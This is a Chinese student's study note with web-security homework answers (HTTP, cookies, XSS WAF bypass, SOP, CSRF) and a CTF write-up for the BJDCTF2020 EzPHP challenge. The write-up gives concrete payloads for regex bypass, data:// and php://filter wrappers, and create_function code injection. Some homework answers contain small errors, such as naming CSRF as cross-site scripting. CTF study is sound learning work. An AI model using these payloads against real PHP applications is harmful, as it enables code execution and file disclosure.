# Nep第五周

## 观看视频

### 1.http报文的结构是什么？（1分）

#### 一、请求行

**请求方法：**GET/POST

**请求URL**

**HTTP协议版本：**HTTP1.0/HTTP1.1

#### 二、请求头部

GET/POST

#### 三、空行

说明请求头到此为止

#### 四、请求数据

如果是GET的话就为空、POST的话就放置要提交的数据

### 2.什么是crlf？在http报文的哪个位置。（1分）

CRLF就是回车换行

在http协议当中，http header和http body是用两个CRLF分隔开的

### 3.解释下这几个头的含义（5分）：

#### Host：

表示请求的服务器网址。比如一台服务器上有百度、谷歌、淘宝。如果我要访问百度这个站点，怎么才能确保我访问www.baidu.com打开的是百度而不是谷歌呢，这时候就用到了Host头来决定要访问的站点

#### Accept：

请求头用来告知服务器可以处理的内容类型，这种内容类型用MIME类型来表示

例子：

```
Accept: text/html
```

``` 
Accept: image/*
```

```
Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8
```

`<MIME_type>/<MIME_subtype>`

单一精确的 MIME类型, 例如`text/html`.

`<MIME_type>/*`

一类 MIME 类型, 但是没有指明子类。 `image/*` 可以用来指代 `image/png`, `image/svg`, `image/gif` 以及任何其他的图片类型。

`*/*`

任意类型的 MIME 类型

`;q=` (q因子权重)

值代表优先顺序，用相对[质量价值](https://developer.mozilla.org/en-US/docs/Glossary/Quality_values)表示，又称作权重。

#### Cookie：

用于传递cookie

#### Referer：

包含了当前请求页面的来源页面的地址，表示当前页面是通过来源页面的链接进入的。就是说可以知道你是从哪个站点访问过来的，服务端可以对此进行统计分析、日志记录等操作。

#### Authorization：

用来做一些token认证

含有服务器用于验证用户代理身份的凭证，通常会在服务器返回`401` `Unauthorized` 状态码以及`WWW-Authenticate`消息头之后在后续请求中发送此消息头。

### 4.cookie具有哪些特点，不同的域名和子域名对cookie有怎样的权限？Cookie的Secure和 HTTPOnly这两个flag分别有什么作用？请结合xss攻击来进行说明（3分）

cookie将数据存储在浏览器端，可以被任意查看，而且存储的是一个固定的时间段，会随着每个请求一起发送出去。cookie可以由任意子域名读取，它可以为自己的子域和父域设置cookie，但是不能为同级设置。

标记了secure的cookie只会通过被HTTPS协议加密过的请求发送给服务端，可以预防攻击。而带有HTTPOnly的cookie无法使用document来获取，这样就有助于缓解xss攻击。

### 5.简述本视频提到的xss绕过web防火墙的方案（5分）

利用了两边解析的不对等来进行绕过。

它使用了一个`script/xss`的标签，浏览器会把`/`给解析为%20(空格)，浏览器会把这当成有效的script标签来执行。防火墙那边则会以为这是一个单纯的scrip/xss样式。所以就可以绕过防火墙了。

### 6.内容嗅探是什么？主要有哪些类型？请分别举例，主要用途是什么？在什么情况下可以利用这些漏洞？。为什么facebook等网站需要使用不同的域名来存储图片？（5分）

内容嗅探：浏览器在显示响应回来的请求文件或者网页时不知道该文件或网页的具体类型，就会启动嗅探机制。

有MIME Sniffing和编码嗅探两种。

 MIME Sniffing会自动探测未知格式的请求文件类型

编码嗅探会自动检测未知格式文件的编码类型。

在IE6/IE7当中没有对响应文件指定MIME，但是文件当中包含了html标签，那么浏览器会将它当成html来进行解析执行，这样可以进行xss攻击。

在Facebook这些大站其实都有用到CSP，CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成。把图片存储在不同的域名上，有CSP进行限制就可以不对图片上的内容进行加载，就不能解析执行html了

### 7.同源策略是什么？限制是什么？浏览器在遇到哪两种情况的时候会用到同源策略？如何放松SOP限制？放松SOP限制会对浏览器插件安全造成怎样的破坏？

同源策略用于限制加载脚本与另一个源的资源进行交互，这是限制跨站访问的主要措施。

限制有这三种：（1） Cookie、LocalStorage 和 IndexDB 无法读取。

​						   （2） DOM 无法获得。

​						   （3） AJAX 请求不能发送。

设置不同域直接的document.domain脚本来实现

会导致XSS攻击，通信交互和信息获取

### 8.csrf是什么？如何设计规避csrf？视频中提到的错误的csrf配置方法是什么？

csrf是跨站脚本攻击（Cross-Site Request Forgery）

可以使用CSRF tokens，随机生成一个令牌附加到用户的会话当中，并嵌入到用户会话的所有生成表单当中，每个生成的表单都会附加发送CSRF token。服务端会进行检查当前的csrf token和之前保存在用户会话session或者cookie中的是否一致。

把CSRF token保存在js文件当中，直接就把生成机制给泄露了。

### 附加题：5、6两点主要利用的是由于服务端和客户端对同一信息的处理方式不同造成的漏洞，你还能举出相似的例子么？（1分）

这题不会了，想不到。

## [BJDCTF2020]EzPHP

在BUU遇到的一道题目，因为考察了太多了知识点了，所以写篇笔记来记录一下。

题目源码：

```php
 <?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?> 
```

### 知识点一：$_SERVER

![image-20210501111629268](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501111629268.png)

首先是这个正则，把下面要用到的参数也给过滤掉了。

`$_SERVER`是php当中的一个超全局变量，它是个包含了非常多信息的数组

![image-20210501111821593](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501111821593.png)

题目中用到了`$_SERVER['QUERY_STRING']`，简单的说就是可以获取到get方式提交的数据

但是`$_SERVER['QUERY_STRING']`是不能自动解析url编码的

例如

```php
<?php
$a = $_GET['a'];
echo $a;
echo "<br>";
var_dump($_SERVER['QUERY_STRING']);
?>
```

![image-20210501113202269](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501113202269.png)

可以看到通过GET方式会将%23自动编码为#，而`$_SERVER['QUERY_STRING']`则还是保持原来的编码，我们就可以利用这一点来绕过这个正则

![image-20210501113802057](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501113802057.png)

### 知识点二：/^aqua_is_cute$/

![image-20210501113951671](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501113951671.png)

这个正则需要完全一致才能匹配到，那么我们可以加个空格或者换行就可以绕过了

![image-20210501114129468](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501114129468.png)

![image-20210501114716722](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501114716722.png)

这里利用了一个%0a来换行绕过

### 知识点三：$_REQUEST

![image-20210501115002293](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501115002293.png)

这里对传进来的参数进行了一个匹配，如果有字母就会die掉

![image-20210501115110499](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501115110499.png)

`$_REQUEST`是可以同时接收POST和GET请求的数据的，而且一般来说POST的优先级会更高

![image-20210501115740932](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501115740932.png)

随便POST提交一个数字上去就能绕过这个了

### 知识点四：data伪协议

![image-20210501120700838](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501120700838.png)

这里对file文件进行匹配，如果里面的内容不是`debu_debu_aqua`就会die掉，上面那里绕过debu之后file参数就是可控的了，我们可以使用data伪协议来进行写入文件

![image-20210501120952116](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501120952116.png)

```php
file=data://text/plain;base64,%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d
```

![image-20210501121636991](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501121636991.png)

### 知识点五：sha1

![image-20210501115829651](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501115829651.png)

查阅php文档发现这个`sha1`函数只能传进去字符串

![image-20210501115915558](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501115915558.png)

那么就简单了，直接用数组就能绕过了

![image-20210501121816608](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501121816608.png)

### 知识点六：create_function()代码注入

![image-20210501122603470](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501122603470.png)

这里不会了，只能去看wp了(太菜了)



了解到这题需要用到create_function这个函数，

![image-20210501123200349](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501123200349.png)

这个可以用来创建一个匿名函数

```php
create_function('$fname','echo $fname."Zhang"')
```

这个就相当于

```php
function fT($fname) {
	echo $fname."Zhang";
}
```



利用create_function代码注入的例子：

```php
<?php
$id=$_GET['id'];
$str2='echo  '.$a.'test'.$id.";";
echo $str2;
echo "<br/>";
echo "==============================";
echo "<br/>";
$f1 = create_function('$a',$str2);
echo "<br/>";
echo "==============================";
?>
```

![image-20210501132251077](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501132251077.png)

```php
源代码：
function fT($a) {
  echo "test".$a;
} 
注入后代码：
function fT($a) {
  echo "test";}
  phpinfo();//;//此处为注入代码。
}
```

利用create_function可以直接写代码进去，后面再用个//给注释掉后面的`}`



![image-20210501132724270](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501132724270.png)

这里对flag.php进行了包含，利用`get_defined_vars`这个函数可以对所有的变量进行输出

![image-20210501132911909](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501132911909.png)

![image-20210501134843578](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501134843578.png)

![image-20210501134951242](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501134951242.png)

看到了flag在rea1fl4g.php那个文件

利用require来对rea1fl4g进行文件包含

```php
require(%62%61%73%65%36%34%5f%64%65%63%6f%64%65(cmVhMWZsNGcucGhw));
```

然后再用`get_defined_vars`读取

![image-20210501142732073](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501142732073.png)

但是这个flag还是假的

去看源码发现flag的确是在里面

![image-20210501142837573](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501142837573.png)

因为使用`get_defined_vars`读取的时候触发了unset函数，导致真正的flag被销毁了

所以只能换一种方法来做



利用php伪协议来进行读取文件源码

![image-20210501144735079](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501144735079.png)

```php
php://filter/read=convert.base64-encode/resource=rea1fl4g.php
```

php当中`~`可以对字符进行取反

取反脚本

```php
<?php
var_dump(urlencode(~"php://filter/read=convert.base64-encode/resource=rea1fl4g.php"));
?>
```

![image-20210501145139141](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501145139141.png)

然后把拿到的base64编码拿去解码就能得到flag了

![image-20210501145257784](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210501145257784.png)